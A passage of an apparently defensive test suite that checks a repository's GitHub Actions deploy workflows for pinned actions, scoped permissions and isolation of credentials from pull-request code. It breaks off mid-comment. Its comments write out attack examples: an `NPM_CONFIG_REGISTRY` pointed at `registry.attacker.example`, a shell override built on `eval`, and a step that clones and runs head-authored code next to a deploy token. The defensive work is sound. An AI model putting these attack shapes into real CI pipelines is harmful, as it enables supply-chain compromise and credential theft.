    // reserved names and `secrets.*`, and nothing else -- a root
    // `NPM_CONFIG_REGISTRY: https://registry.attacker.example/` reaches
    // every job, `validate`'s steps declare no `env:` of their own, and its
    // byte-pinned `npm ci` installs the entire dependency tree -- lifecycle
    // scripts included -- from an attacker registry, in the job both `build`
    // and `promote` `needs:`. The same shape as pass 3's job-level
    // `container:`: the step text is pinned and the thing executing it (here,
    // the package registry `npm` resolves against) is substituted. Closing
    // the root key set outright refuses a root `env:` at all -- nothing
    // legitimately needs one -- rather than enumerating the names that would
    // be dangerous inside it, which is the same enumeration mistake this
    // whole pass exists to stop making. Scoped to `RELEASE` and
    // `DEPLOY_TEST` -- the two workflows this row holds a credential in --
    // rather than every discovered file: `validate.yml` is a different
    // row's file, legitimately has no `concurrency:` (nothing in it ever
    // writes `deploys`, so there is no promotion lane to serialise), and
    // closing its root key set is not this row's guarantee to make.
    for (const name of [RELEASE, DEPLOY_TEST]) {
      expect(Object.keys(workflow(name)).sort(), name).toEqual(
        ["name", "on", "concurrency", "permissions", "jobs"].sort(),
      );
    }
  });

  for (const name of names) {
    it(`${name} reassigns no job's or step's own env: over a reserved runner file variable`, () => {
      for (const id of Object.keys(jobs(name))) {
        expect(reservedEnvOffences(name, id), `${name}.${id}`).toEqual([]);
      }
    });
  }

  for (const name of names) {
    it(`${name} declares no defaults:, at the workflow root or on any job`, () => {
      // A `defaults.run.shell` override changes *how* every pinned `run:`
      // body in its scope executes -- GitHub Actions accepts an arbitrary
      // command template there, e.g. `sh -c 'eval "$0"; "$@"' --` -- without
      // touching a single byte of the script text the exact-step pin above
      // compares. Workflow-root, it reaches every job including `gate` and
      // `promote`; job-level, it reaches every step in that one job. Neither
      // is legitimately needed here: every step in every job already runs
      // under the runner's own default `bash`.
      expect(Object.keys(workflow(name)), name).not.toContain("defaults");
      for (const [id, body] of Object.entries(jobs(name))) {
        expect(Object.keys(asMapping(body, id)), `${name}.${id}`).not.toContain("defaults");
      }
    });
  }

  for (const name of names) {
    it(`${name} interpolates no expression into any run: body`, () => {
      expect(
        interpolationOffences(everyScript(name)),
        `${name} interpolates a workflow expression into a shell script`,
      ).toEqual([]);
    });
  }

  for (const name of names) {
    it(`${name} pins every action to a 40-character commit SHA`, () => {
      expectEveryActionPinned(name, source(name));
    });

    it(`${name} says in a comment which release each pinned SHA is`, () => {
      for (const [reference, comment] of pinAnnotations(name)) {
        const action = reference.split("@")[0]!;
        expect(comment, `${name} annotates ${reference} as "${comment}"`).toMatch(
          new RegExp(`^${action.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")} v\\S+$`),
        );
      }
    });

    it(`${name} declares explicit permissions for every job`, () => {
      // A job inherits the workflow-level grant when it declares none, so the
      // effective grant is what matters -- and it must always be written down.
      const fallback = workflow(name)["permissions"];
      for (const [id, body] of Object.entries(jobs(name))) {
        const permissions = asMapping(body, `${name}.${id}`)["permissions"] ?? fallback;
        expect(permissions, `${name}.${id} has no effective permissions`).toBeDefined();
        for (const scope of Object.values(asMapping(permissions!, `${name}.${id}.permissions`))) {
          expect(["read", "write", "none"]).toContain(asScalar(scope, "permission"));
        }
      }
    });
  }

  it("annotates one commit SHA the same way in every workflow", () => {
    // Two files pinning the same SHA to different releases means at least one
    // comment is false, and a false comment is worse than none: it is what a
    // reader checks the pin against.
    const annotations = new Map<string, Map<string, string[]>>();
    for (const name of names) {
      for (const [reference, comment] of pinAnnotations(name)) {
        const byComment = annotations.get(reference) ?? new Map<string, string[]>();
        byComment.set(comment, [...(byComment.get(comment) ?? []), name]);
        annotations.set(reference, byComment);
      }
    }
    for (const [reference, byComment] of annotations) {
      expect(
        [...byComment].map(([comment, where]) => `${comment} (${where.join(", ")})`),
        `${reference} is annotated inconsistently`,
      ).toHaveLength(1);
    }
  });
});

// `scripts/validate` refuses outright when a tool it needs is absent, so any
// job that runs it must also install those tools. The `Release` row shipped a
// `validate` job that did not, and no assertion here noticed: 278 mutations
// across five review passes all interrogated the parsed document, and a
// document can be perfectly well-formed and still describe a job that cannot
// run. The tool list is read from `scripts/validate` itself rather than
// repeated, so adding a tool there cannot silently leave a caller behind.
//
// `shellcheck` ships on the `ubuntu-24.04` image; `node` and `npm` arrive with
// `actions/setup-node`. Everything else needs an explicit step.
const RUNNER_PROVIDED_TOOLS = new Set(["shellcheck", "node", "npm"]);

function toolsRequiredByValidate(): string[] {
  const script = readFileSync(join(repoRoot, "scripts", "validate"), "utf8");
  const declaration = /^for tool in ([^;]+); do$/m.exec(script)?.[1];
  expect(
    declaration,
    "scripts/validate no longer declares its required tools in a form this test can read",
  ).toBeTypeOf("string");
  return String(declaration)
    .trim()
    .split(/\s+/)
    .filter((tool) => !RUNNER_PROVIDED_TOOLS.has(tool));
}

describe("every job that runs scripts/validate installs what it needs", () => {
  const required = toolsRequiredByValidate();

  it("reads a non-empty tool list from scripts/validate", () => {
    expect(required.length, "no externally-installed tool was found").toBeGreaterThan(0);
  });

  const discovered = readdirSync(workflowDirectory).filter(
    (entry) => entry.endsWith(".yml") || entry.endsWith(".yaml"),
  );

  for (const name of discovered) {
    for (const id of Object.keys(jobs(name))) {
      const runsValidate = jobScripts(name, id).some(([, script]) =>
        commands(script).some((command) => /\bbash\s+scripts\/validate\b/.test(command)),
      );
      if (!runsValidate) continue;
      it(`${name}.${id} installs every tool scripts/validate requires`, () => {
        const text = jobText(name, id);
        for (const tool of required) {
          expect(
            text,
            `${name}.${id} runs scripts/validate but installs no ${tool}, so the job aborts before it validates anything`,
          ).toMatch(new RegExp(`/usr/local/bin/${tool}\\b`));
        }
      });
    }
  }
});

describe("the pin check itself", () => {
  // The check above is only as good as what it accepts and what it refuses,
  // and neither is observable from workflows that all happen to be written
  // one way. These drive it with sources this repository does not contain.

  /** A minimal single-job workflow wrapped around the given `steps:` lines. */
  function workflowAround(step: readonly string[]): string {
    return [
      "---",
      "name: Fixture",
      "'on': push",
      "permissions: {}",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-24.04",
      "    steps:",
      ...step,
      "",
    ].join("\n");
  }

  const PINNED = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1";

  it("accepts a correctly pinned step whose first key is `uses`", () => {
    // `- uses: …` is ordinary GitHub Actions. A cross-check anchored to
    // `^\s*uses:` never matched the line, so the parsed reference had no
    // counterpart in the source and the count disagreed -- rejecting a
    // properly pinned action for how its step is laid out.
    expect(() =>
      expectEveryActionPinned(
        "fixture.yml",
        workflowAround([
          "      # actions/checkout v7.0.1",
          `      - uses: ${PINNED}`,
          "        with:",
          "          persist-credentials: false",
        ]),
      ),
    ).not.toThrow();
  });

  it("still refuses a mutable ref hidden behind a trailing comment", () => {
    // A grep anchored to `@[0-9a-f]{40}$` passes this line: the ref really is
    // `main`, but the comment after it is what sits at the end of the line.
    // The parser reads the whole scalar, comment included, so the pin pattern
    // -- which requires no trailing text -- correctly fails it.
    expect(() =>
      expectEveryActionPinned(
        "fixture.yml",
        workflowAround([
          "      - name: Set up Buildx",
          "        # docker/setup-buildx-action v4.2.0",
          "        uses: docker/setup-buildx-action@main # unpinned, mutable ref",
        ]),
      ),
    ).toThrow(/does not pin/);
  });

  it("refuses a mutable ref on a step whose first key is `uses`", () => {
    expect(() =>
      expectEveryActionPinned(
        "fixture.yml",
        workflowAround([
          "      # docker/setup-buildx-action v4.2.0",
          "      - uses: docker/setup-buildx-action@main # unpinned, mutable ref",
        ]),
      ),
    ).toThrow(/does not pin/);
  });
});

describe("Deploy Test's trigger and concurrency", () => {
  it("fires only on a label applied to a pull request targeting main", () => {
    const document = workflow(DEPLOY_TEST);
    expect(document["name"]).toBe("Deploy Test");
    const on = asMapping(document["on"]!, "on");
    expect(Object.keys(on)).toEqual(["pull_request_target"]);
    const trigger = asMapping(on["pull_request_target"]!, "pull_request_target");
    expect(asSequence(trigger["branches"]!, "branches")).toEqual(["main"]);
    expect(asSequence(trigger["types"]!, "types")).toEqual(["labeled"]);
  });

  it("does not cancel an in-flight promotion", () => {
    // Recorded, not closed (review pass 5): this reads `group` and
    // `cancel-in-progress` by name and never asks what else is in the
    // mapping. Left open deliberately -- unlike a job's or the workflow
    // root's own key set, `concurrency:`'s sub-keys are validated by GitHub
    // Actions at workflow-parse time; an unrecognised key here fails the
    // whole run before any job starts, which is a stronger and earlier
    // backstop than anything this suite could add.
    const concurrency = asMapping(workflow(DEPLOY_TEST)["concurrency"]!, "concurrency");
    expect(concurrency["group"]).toBe("lousydeal-gitops-promotion");
    expect(concurrency["cancel-in-progress"]).toBe("false");
  });

  it("grants the workflow no permissions by default", () => {
    expect(asMapping(workflow(DEPLOY_TEST)["permissions"]!, "permissions")).toEqual({});
  });

  it("runs the gate only for the deploy-test label on an open pull request", () => {
    const condition = asScalar(job(DEPLOY_TEST, "gate")["if"]!, "gate.if");
    expect(condition).toMatch(/github\.event\.label\.name == 'deploy-test'/);
    expect(condition).toMatch(/github\.event\.pull_request\.state == 'open'/);
  });
});

describe("Deploy Test's three-job split and its job permissions", () => {
  // The reference implementation this row adapts uses four jobs: `gate`,
  // `build`, `recheck`, `promote`. This row drops `recheck` as a *job* and
  // folds its check -- the pull request is still open, still same-head,
  // still labelled -- into `promote`'s own first step, run before any
  // credential is minted and before anything is checked out. That keeps both
  // halves of the split (see the two describe blocks below) and shrinks the
  // gap between "re-verified" and "credential minted" to zero rather than one
  // job-scheduling boundary. It is why `promote` below carries
  // `pull-requests: read` rather than the reference's `{}` -- that scope is
  // spent on the re-verification read, not on anything credentialed.
  const expected: ReadonlyArray<readonly [string, Record<string, string>]> = [
    ["gate", { actions: "read", contents: "read", "pull-requests": "read" }],
    ["build", { contents: "read", packages: "write" }],
    ["promote", { "pull-requests": "read" }],
  ];

  it("declares exactly these three jobs", () => {
    expect(Object.keys(jobs(DEPLOY_TEST))).toEqual(expected.map(([id]) => id));
  });

  for (const [id, permissions] of expected) {
    it(`gives ${id} exactly ${JSON.stringify(permissions)}`, () => {
      expect(asMapping(job(DEPLOY_TEST, id)["permissions"]!, `${id}.permissions`)).toEqual(
        permissions,
      );
    });
  }

  it("scopes the deployer credential to the promote job's test environment", () => {
    for (const id of ["gate", "build"]) {
      expect(job(DEPLOY_TEST, id)["environment"]).toBeUndefined();
      // A blanket ban, not a name check: asserting only that
      // `LOUSYDEAL_DEPLOYER_` is absent lets any *other* secret --
      // `secrets.SOME_OTHER_DEPLOY_KEY`, or a name nobody has thought of yet
      // -- walk into the job that runs head code. `secretsReferenced` also
      // reads the workflow's own root `env:` (there is none today, but a job
      // with no `env:` of its own inherits one that exists), which
      // `jobText` -- `scalars(job(...))` alone -- cannot see at all.
      expect(secretsReferenced(DEPLOY_TEST, id), `${id} references a secret`).toEqual([]);
    }
    expect(job(DEPLOY_TEST, "promote")["environment"]).toBe("test");
    expect([...new Set(secretsReferenced(DEPLOY_TEST, "promote"))].sort()).toEqual([
      "secrets.LOUSYDEAL_DEPLOYER_CLIENT_ID",
      "secrets.LOUSYDEAL_DEPLOYER_PRIVATE_KEY",
    ]);
  });
});

describe("the gate reads the guard from the base SHA", () => {
  it("checks nothing out and runs no head code", () => {
    for (const step of steps(DEPLOY_TEST, "gate")) {
      expect(step["uses"]).toBeUndefined();
    }
    expect(jobText(DEPLOY_TEST, "gate")).not.toMatch(/npm (ci|test)|docker build/);
  });

  it("fetches scripts/update-gitops-digest.sh at the base SHA, never the head SHA", () => {
    const gate = jobText(DEPLOY_TEST, "gate");
    expect(gate).toMatch(/BASE_SHA/);
    expect(gate).toMatch(/github\.event\.pull_request\.base\.sha/);
    expect(gate).toMatch(/contents\/scripts\/update-gitops-digest\.sh\?ref=\$\{BASE_SHA\}/);
    expect(gate).not.toMatch(/update-gitops-digest\.sh\?ref=\$\{HEAD_SHA\}/);
    expect(gate).toMatch(/grep -qx '#!\/bin\/sh'/);
  });

  it("verifies the pull request is open, same-repository and targets main", () => {
    const gate = jobText(DEPLOY_TEST, "gate");
    expect(gate).toMatch(/\[ "\$BASE_REF" = main \]/);
    expect(gate).toMatch(/\[ "\$HEAD_REPOSITORY" = "\$REPOSITORY" \]/);
    expect(gate).toMatch(/\.state == "open"/);
    expect(gate).toMatch(/\.head\.repo\.full_name == \$repository/);
    expect(gate).toMatch(/\.head\.sha == \$head_sha/);
    expect(gate).toMatch(/\^\[0-9a-f\]\{40\}\$/);
  });

  it("requires that head SHA's Validate run to have concluded success", () => {
    const gate = jobText(DEPLOY_TEST, "gate");
    expect(gate).toMatch(/head_sha=\$\{HEAD_SHA\}/);
    expect(gate).toMatch(/select\(\.name == "Validate"/);
    expect(gate).toMatch(/\[ "\$conclusion" = success \]/);
  });

  it("hands the guard to the promotion, and only to the promotion", () => {
    expect(asMapping(job(DEPLOY_TEST, "gate")["outputs"]!, "gate.outputs")["guard"]).toBe(
      "${{ steps.verify.outputs.guard }}",
    );
    expect(jobText(DEPLOY_TEST, "build")).not.toMatch(/needs\.gate\.outputs\.guard|GUARD_CONTENT/);
    expect(jobText(DEPLOY_TEST, "promote")).toMatch(/needs\.gate\.outputs\.guard/);
    expect(jobText(DEPLOY_TEST, "promote")).not.toMatch(/needs\.build\.outputs\.guard/);
  });
});

describe("the label and state gates fail closed, not merely in the right position", () => {
  // Position and wording are not the property. `jq -e` is what makes a
  // mismatched or absent field abort the script under `set -e`; without
  // `-e`, `jq` prints `false` (or nothing, for an absent field) and exits 0,
  // and the check becomes decoration -- `promote` spends the credential
  // regardless of what it found. Five ways to make that happen, all checked:
  // `jq -e` -> `jq`, a trailing `|| true`, `continue-on-error: true` on the
  // step, the same on the job, and a step- or job-level `if:` that could skip
  // it. `set -euo pipefail` heading the script is what the other four rest
  // on -- without it, even a correctly-`-e`'d `jq` failing would not abort
  // anything.
  //
  // Both gate's own PR-state filter and promote's folded-in re-verification
  // close with the identical, otherwise-unique line
  // `' >/dev/null <<<"$pull_request"` -- one regex spanning from `jq -e` to
  // that line, anchored at end-of-line, catches the flag dropping *and* a
  // `|| true` appended after it (which would move the line's own end past the
  // anchor) in a single assertion.
  const CLOSING = '\' >/dev/null <<<"$pull_request"';
  const CLOSING_PATTERN = CLOSING.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

  function gatingStep(id: string): { readonly script: string; readonly step: { readonly [key: string]: YamlValue } } {
    const index = steps(DEPLOY_TEST, id).findIndex(
      (candidate) => typeof candidate["run"] === "string" && candidate["run"].includes(CLOSING),
    );
    expect(index, `${id} has no step running the expected gating filter`).toBeGreaterThanOrEqual(0);
    const step = steps(DEPLOY_TEST, id)[index]!;
    return { script: asScalar(step["run"]!, `${id} gating script`), step };
  }

  for (const id of ["gate", "promote"]) {
    it(`${id}'s gating filter aborts the step when it is false, absent, or tolerated`, () => {
      const { script, step } = gatingStep(id);
      expect(script, `${id} does not run under set -e`).toMatch(/^set -euo pipefail$/m);
      expect(
        script,
        `${id}'s gating filter is not run with jq -e, or is tolerated by a trailing || true`,
      ).toMatch(new RegExp(`jq -e[a-z]*\\b[\\s\\S]*?${CLOSING_PATTERN}$`, "m"));
      expect(step["continue-on-error"], `${id}'s gating step tolerates its own failure`).toBeUndefined();
      expect(step["if"], `${id}'s gating step carries a step-level conditional`).toBeUndefined();
      expect(
        job(DEPLOY_TEST, id)["continue-on-error"],
        `${id} tolerates a failed step`,
      ).toBeUndefined();
    });
  }

  it("promote itself carries no job-level conditional that could skip the re-verification", () => {
    // `gate`'s job-level `if:` is the real trigger gate and is asserted
    // elsewhere; `promote` needing `gate`, `build` and nothing else is
    // asserted in the ordering test above. This is the property those two
    // do not cover: `promote` itself must run unconditionally once its
    // dependencies succeed, so the re-verification step inside it is not
    // itself skippable by a job-level `if:`.
    expect(job(DEPLOY_TEST, "promote")["if"]).toBeUndefined();
  });
});

describe("the build holds no GitOps credential", () => {
  it("checks out the gated head SHA without persisting credentials", () => {
    const checkout = steps(DEPLOY_TEST, "build").find((step) =>
      typeof step["uses"] === "string" && step["uses"].startsWith("actions/checkout@"),
    );
    expect(checkout).toBeDefined();
    const withBlock = asMapping(checkout!["with"]!, "build checkout with");
    expect(withBlock["ref"]).toBe("${{ needs.gate.outputs.head_sha }}");
    expect(withBlock["persist-credentials"]).toBe("false");
  });

  it("never checks out or writes the deploys repository", () => {
    const build = jobText(DEPLOY_TEST, "build");
    expect(build).not.toMatch(/hannosirkel\/deploys/);
    expect(build).not.toMatch(/lousydeal\/overlays/);
  });

  it("builds and publishes both images with attestations", () => {
    const build = jobText(DEPLOY_TEST, "build");
    expect(build).toMatch(/--provenance=mode=min/);
    expect(build).toMatch(/--sbom=true/);
    expect(build).not.toMatch(/--provenance=false/);
    expect(build).toMatch(/ghcr\.io\/hannosirkel\/lousydeal-backend/);
    expect(build).toMatch(/ghcr\.io\/hannosirkel\/lousydeal-storefront/);
    const outputs = asMapping(job(DEPLOY_TEST, "build")["outputs"]!, "build.outputs");
    expect(Object.keys(outputs).sort()).toEqual(["backend_digest", "storefront_digest"]);
  });

  it("guards each published digest against the sentinel's own shape, and never a tag", () => {
    // A promotion must write a digest and never a tag: T13's overlays and
    // `deploys/lousydeal/tests/manifests.sh` already hold that property on the
    // *written* side (`^sha256:[0-9a-f]{64}$`, on the committed file). This is
    // the same property enforced on the *writing* side: the value extracted
    // from `docker buildx build`'s own metadata is refused, before it is ever
    // handed to `promote`, unless it already has that exact shape.
    expectDigestGuardedAndEmittedUnchanged(publishInvocation(DEPLOY_TEST).script);
  });

  it("publishes each Dockerfile's final stage, naming no other target", () => {
    // `--target build` would ship the compiler stage rather than the runtime
    // stage `scripts/images.test.ts` makes its guarantees about -- `USER
    // 10001:10001` and a cleared `ENTRYPOINT` (images.test.ts:334-343) -- with
    // both assertions still green, because the file they read did not change.
    expect(
      publishInvocation(DEPLOY_TEST).invocation,
      `${DEPLOY_TEST} publishes a named stage, so the Dockerfile assertions describe a different image`,
    ).not.toMatch(/(?:^|\s)--target(?:[=\s]|$)/);
  });

  it("fetches no remote code to execute, though it legitimately runs docker", () => {
    // M-g: `packages: write` is a credential too, spent in this job -- a step
    // that curls a script and pipes it to `bash` here reaches GHCR the same
    // way it would reach `hannosirkel/deploys` from `promote`.
    expect(buildRemoteCodeOffences(jobScripts(DEPLOY_TEST, "build"))).toEqual([]);
  });
});

/** The promote step that commits and pushes, as its shell source. */
function commitScript(name: string): string {
  const commit = steps(name, "promote")
    .map((step) => (typeof step["run"] === "string" ? step["run"] : ""))
    .find((run) => run.includes("git push"));
  expect(commit, `${name} promote has no step that pushes`).toBeDefined();
  return commit!;
}

describe("the promotion writes exactly one overlay", () => {
  it("re-verifies the pull request before minting or spending any credential", () => {
    const promoteSteps = steps(DEPLOY_TEST, "promote");
    const recheckIndex = promoteSteps.findIndex((step) =>
      typeof step["run"] === "string" && step["run"].includes('any(.labels[]; .name == "deploy-test")'),
    );
    const tokenIndex = promoteSteps.findIndex((step) => step["id"] === "app-token");
    expect(recheckIndex, "promote never re-verifies the pull request").toBeGreaterThanOrEqual(0);
    expect(tokenIndex, "promote never mints a token").toBeGreaterThanOrEqual(0);
    expect(recheckIndex, "the re-verification runs after the credential is minted").toBeLessThan(
      tokenIndex,
    );

    const recheck = asScalar(promoteSteps[recheckIndex]!["run"]!, "promote recheck run");
    expect(recheck).toMatch(/\.state == "open"/);
    expect(recheck).toMatch(/any\(\.labels\[\]; \.name == "deploy-test"\)/);
    // The re-verification step itself must hold no credential either: it is a
    // read against the GitHub API with the workflow's own scoped token, not
    // the GitOps deployer's. Blanket, not a name check -- see
    // `secretsReferenced`. Case-insensitive for the same reason
    // `secretsReferenced` is: the runner resolves `SECRETS.NAME` and
    // `Secrets.NAME` identically to `secrets.NAME`.
    expect(recheck.match(/secrets\.[A-Za-z0-9_]+/gi) ?? []).toEqual([]);

    expect(asSequence(job(DEPLOY_TEST, "promote")["needs"]!, "promote.needs")).toEqual([
      "gate",
      "build",
    ]);
  });

  it("mints a token scoped to the deploys repository alone", () => {
    const promote = jobText(DEPLOY_TEST, "promote");
    expect(promote).toMatch(/"repositories":\["deploys"\]/);
    expect(promote).toMatch(/::add-mask::/);
    const checkouts = steps(DEPLOY_TEST, "promote").filter(
      (step) => typeof step["uses"] === "string" && step["uses"].startsWith("actions/checkout@"),
    );
    expect(checkouts, "promote checks out more than one tree").toHaveLength(1);
    const inputs = withBlock(checkouts[0]!, "promote checkout");
    // Closed, not four named reads out of an open mapping -- see the
    // identical note on Release's own version of this check.
    expect(Object.keys(inputs).sort()).toEqual(["path", "persist-credentials", "repository", "token"]);
    expect(inputs["repository"]).toBe("hannosirkel/deploys");
    expect(inputs["token"]).toBe("${{ steps.app-token.outputs.token }}");
    expect(inputs["path"]).toBe("gitops");
    expect(inputs["persist-credentials"]).toBe("false");
  });

  it("runs no head code in the job that holds the GitOps credential", () => {
    // Checking the *first* checkout in the job proves nothing: a second one,
    // later in the same job, would put head-authored code on disk next to a
    // write token for hannosirkel/deploys. So every step is examined, and so
    // is the job itself -- a job-level `container:` naming a head-built
    // digest (`ghcr.io/hannosirkel/lousydeal-backend@${{
    // needs.build.outputs.backend_digest }}`) would run every one of this
    // job's steps, App-token mint and `git push` included, *inside* an image
    // built from the pull request's own Dockerfile, with every per-step
    // assertion below still green. `services:` is the identical hole one
    // level down. Four ways head code could arrive, all four checked.
    const promoteJob = job(DEPLOY_TEST, "promote");
    expect(Object.keys(promoteJob), "promote runs inside a job-level container").not.toContain(
      "container",
    );
    expect(
      Object.keys(promoteJob),
      "promote declares a job-level services container",
    ).not.toContain("services");
    // See the identical note on Release's own version of this check: nothing
    // `needs: promote`, so a job-level `outputs:` here would exist only to
    // put the minted GitOps write-token on the job-output surface.
    expect(Object.keys(promoteJob), "promote declares a job-level outputs: block").not.toContain(
      "outputs",
    );

    const promoteSteps = steps(DEPLOY_TEST, "promote");
    for (const [index, step] of promoteSteps.entries()) {
      const path = `promote.steps[${index}]`;
      const action = step["uses"];
      if (action !== undefined) {
        expect(asScalar(action, `${path}.uses`), `${path} runs an action other than a checkout`)
          .toMatch(/^actions\/checkout@[0-9a-f]{40}$/);
        expect(
          withBlock(step, path)["repository"],
          `${path} checks out something other than the GitOps repository`,
        ).toBe("hannosirkel/deploys");
      }
      // A `ref:` on this job's checkout would name a revision to fetch, and
      // the only revision this job may ever act on is the one `git commit -m`
      // records -- so no step here may name one at all, structurally, not
      // merely "not the head SHA". `grep -c head_sha` on the whole file finds
      // the string in `build`'s checkout and in the commit message too, both
      // legitimate, so it cannot tell a leak into `promote` from those. Only
      // reading `promote`'s own steps can.
      expect(keysOf(step), `${path} names a revision to check out`).not.toContain("ref");
      for (const [key, value] of Object.entries(withBlock(step, path))) {
        expect(
          scalars(value).join("\n"),
          `${path}.with.${key} hands the head revision to an action`,
        ).not.toMatch(/head_sha/);
      }
    }
  });

  it("names the head revision only as an argument to git commit", () => {
    // The test above reads the declarative surface -- `uses`, any `ref`, and
    // every `with:` input. It does not read `run:` bodies, and `promote`'s
    // env carries `HEAD_SHA` so the commit message can record it. That gap
    // admits a step such as
    //
    //   run: git clone … && git -C head checkout "$HEAD_SHA" && bash head/hook.sh
    //
    // which is head-authored code executing in the one job that holds a write
    // token for hannosirkel/deploys, with every declarative assertion above
    // still green.
    // The folded-in re-verification step (see the previous test) legitimately
    // compares `$head_sha` against the API's own answer, before any
    // credential exists in this job -- that is a read, not an action, and it
    // is what the previous test already pins down by requiring it to run
    // ahead of the token-minting step. Excluded here by step index so this
    // test is about what happens once the job actually holds the credential.
    const recheckIndex = steps(DEPLOY_TEST, "promote").findIndex(
      (step) =>
        typeof step["run"] === "string" &&
        step["run"].includes('any(.labels[]; .name == "deploy-test")'),
    );
    const offending: string[] = [];
    for (const [index, script] of jobScripts(DEPLOY_TEST, "promote")) {
      if (index === recheckIndex) continue;
      for (const command of commands(script)) {
        if (!/head_sha/i.test(command)) continue;
        if (/^git commit -m /.test(command)) continue;
        offending.push(`promote.steps[${index}]: ${command}`);
      }
    }
    expect(offending, "promote acts on the head revision outside its commit message").toEqual([]);
  });

  it("brings no code into the job that holds the GitOps credential", () => {
    expect(codeImportOffences(jobScripts(DEPLOY_TEST, "promote"))).toEqual([]);
  });

  it("runs the base-SHA guard against the test overlay with both digests", () => {
    const promote = jobText(DEPLOY_TEST, "promote");
    expect(promote).toMatch(
      /"\$guard" "\$BACKEND_DIGEST" "\$STOREFRONT_DIGEST" "\$GITHUB_WORKSPACE\/gitops\/lousydeal\/overlays\/test"/,
    );
    expect(promote).not.toMatch(/"\$guard".*lousydeal\/overlays\/live/);
  });

  it("stages, validates and commits only the test overlay", () => {
    const promote = jobText(DEPLOY_TEST, "promote");
    expect(promote).toMatch(/git add lousydeal\/overlays\/test\/kustomization\.yaml/);
    expect(promote).not.toMatch(/git add lousydeal\/overlays\/live\/kustomization\.yaml/);
    expect(promote).not.toMatch(/git add --all|git commit -a\b/);
    expect(promote).toMatch(
      /deploy\(test\): PR #\$\{PR_NUMBER\} \$\{HEAD_SHA\} \$\{BACKEND_DIGEST\} \$\{STOREFRONT_DIGEST\}/,
    );
    expect(promote).not.toMatch(/--force|git rebase/);
  });

  it("stages exactly the test overlay's kustomization and nothing else", () => {
    // M-h: `not.toMatch(/git add …\/live\/…/)` above is defeated by argument
    // order -- `git add …/test/… …/live/…` never contains the literal
    // substring `git add lousydeal/overlays/live/kustomization.yaml`, so it
    // is invisible to a `not.toMatch` built from that one ordering. Inert
    // today only because `[ "$staged" = … ]` a few lines later would still
    // catch the second path being staged -- but that check is exactly as
    // capable of being weakened as this one was, so this asserts the staged
    // set positively instead of by one ordering's absence.
    const commit = commitScript(DEPLOY_TEST);
    const addCommands = commands(commit).filter((line) => /^git add\b/.test(line));
    expect(addCommands, "promote runs more than one git add").toHaveLength(1);
    expect(addCommands[0]).toBe("git add lousydeal/overlays/test/kustomization.yaml");
  });

  it("renders both overlays and runs the manifest tests before pushing", () => {
    const commit = commitScript(DEPLOY_TEST);
    const order = (needle: string): number => commit.indexOf(needle);
    const push = order("git push");
    for (const before of [
      "bash lousydeal/tests/manifests.sh",
      "kubectl kustomize lousydeal/overlays/live",
      "kubectl kustomize lousydeal/overlays/test",
      "git diff --check",
      "git diff --cached --check",
    ]) {
      expect(order(before), `${before} must run before git push`).toBeGreaterThanOrEqual(0);
      expect(order(before)).toBeLessThan(push);
    }
  });

  it("treats an already-recorded digest pair as nothing to promote", () => {
    // The message is not the behaviour: without the `exit 0` the script falls
    // through to `git commit`, which fails on an empty index and turns a
    // re-labelled pull request into a red run. Assert the early exit itself.
    const commit = commitScript(DEPLOY_TEST);
    expect(commit).toMatch(
      /if \[ -z "\$staged" \]; then\n\s+echo '[^']*nothing to promote'\n\s+exit 0\n\s*fi\n/,
    );
    expect(commit.indexOf("exit 0")).toBeLessThan(commit.indexOf("git commit"));
  });
});

describe("Deploy Test never reaches another application", () => {
  it("names no repository or overlay outside lousydeal and deploys", () => {
    const text = source(DEPLOY_TEST);
    expect(text).not.toMatch(/plepic|servitium/);
    expect(text).not.toMatch(/hannosirkel\/(?!deploys|lousydeal)/);
  });

  it("publishes no image and writes no overlay from the validation workflow", () => {
    const text = source(VALIDATE);
    expect(text).not.toMatch(/pull_request_target/);
    expect(text).not.toMatch(/packages: write/);
    expect(text).not.toMatch(/update-gitops-digest/);
    expect(text).not.toMatch(/lousydeal\/overlays/);
  });
});

/**
 * The mechanism change this pass makes (review pass 2's fix brief, first
 * substantive section): `gate` and `promote` in `release.yml` are small,
 * fully base-controlled, and never legitimately vary. Every earlier
 * mechanism in this file for those two jobs was a blacklist -- refuse a
 * spelling of "swallows a failure", refuse a spelling of "reaches
 * `secrets`", refuse a fourth YAML key shaped one specific way -- and every
 * one of them was defeated by a spelling it did not enumerate. Instead of
 * asserting properties *about* their steps, this pins **what their steps
 * are**: a step's `run:` body compared verbatim (trailing whitespace per
 * line stripped, and nothing else -- `normalizeRun` below), and its
 * non-`run:` key set -- `if:`, `continue-on-error`, `shell:`, `env:`,
 * `timeout-minutes`, `id`, `uses`, `with:`, everything -- compared exactly.
 * That closes, by construction, every spelling of a swallowed failure
 * (eleven and counting), a step-level `if:` on any step, an `env:` addition
 * or override, a `shell:` substitution, and the private-key exfiltration in
 * MAJOR 6 below, whether or not any of them was anticipated: editing a
 * pinned step now means editing its fixture here too.
 *
 * `validate` is pinned the same way (added after this row's own review
 * caught the gap): its four steps are exactly as base-controlled as
 * `gate`'s and `promote`'s, and neutering it is the *worse* case, not a
 * lesser one -- `build` and `promote` both `needs: validate`, so a `validate`
 * that always reports green regardless of what `bash scripts/validate`
 * actually finds removes the one check standing in front of both. Pinning it
 * closes, by the same construction: `bash scripts/validate || :` and `|| echo
 * skipped` (the two-spelling blacklist this replaced enumerated `|| true`
 * and `|| exit 0` and nothing else), and a step-level `if: ${{ false }}` on
 * "Run canonical validation".
 *
 * `build` is pinned too (review pass 3's disqualifying finding): this file
 * previously reasoned that `build`'s longer steps and absence of a GitOps
 * credential earned it an exemption, kept on property-style assertions
 * instead. That reasoning did not survive review. `build` holds
 * `packages: write`, is the sole producer of every value the promotion
 * consumes, and "longer" is not "legitimately varying" -- all seven of its
 * steps are exactly as base-controlled as `gate`'s or `promote`'s. Left
 * unpinned, a property check bounded to one filter (`GITHUB_OUTPUT`, with
 * the quotes -- see `GITHUB_OUTPUT_PATTERN`'s own history above) missed a
 * `trap` written the one other way, and property checks in general proved
 * unable to rule out a wrong Dockerfile, a poisoned `COPY --from=`, a second
 * `docker login` to an attacker registry, or an extra published tag --
 * every one of which a pinned step closes by construction, the same way
 * pinning closed the eleven failure-swallow spellings above. There is no
 * job left in this workflow the mechanism change does not reach.
 */
function normalizeRun(script: string): string {
  // Trailing whitespace is stripped per physical line, *except* immediately
  // after a `\` line-continuation (M6, review pass 3). `foo \` (bare
